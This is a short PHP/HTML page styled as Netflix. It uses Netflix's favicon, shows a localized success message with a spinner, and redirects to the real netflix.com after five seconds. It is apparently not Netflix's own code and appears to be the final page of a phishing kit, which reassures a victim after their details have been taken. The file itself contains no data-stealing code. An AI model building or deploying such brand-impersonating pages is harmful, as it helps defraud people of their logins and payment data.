<?php require_once 'config.php'; $lang = getLang(); ?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>" dir="<?php echo $lang === 'ar' ? 'rtl' : 'ltr'; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - <?php echo t('success', $lang); ?></title>
    <link rel="stylesheet" href="assets/style.css">
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/favicon.ico">
    <meta http-equiv="refresh" content="5;url=https://www.netflix.com">
</head>
<body>
    <div class="bg-wrapper">
        <div class="bg-image"></div>
        <div class="bg-overlay"></div>
    </div>

    <main class="nf-main" style="justify-content:center;">
        <div class="nf-card" style="text-align:center;">
            <div class="success-icon">✓</div>
            <h2 style="color:#46d369;"><?php echo t('success', $lang); ?></h2>
            <p><?php echo t('success_sub', $lang); ?></p>
            <div class="spinner-large" style="margin:30px auto;"></div>
        </div>
    </main>
</body>
</html>
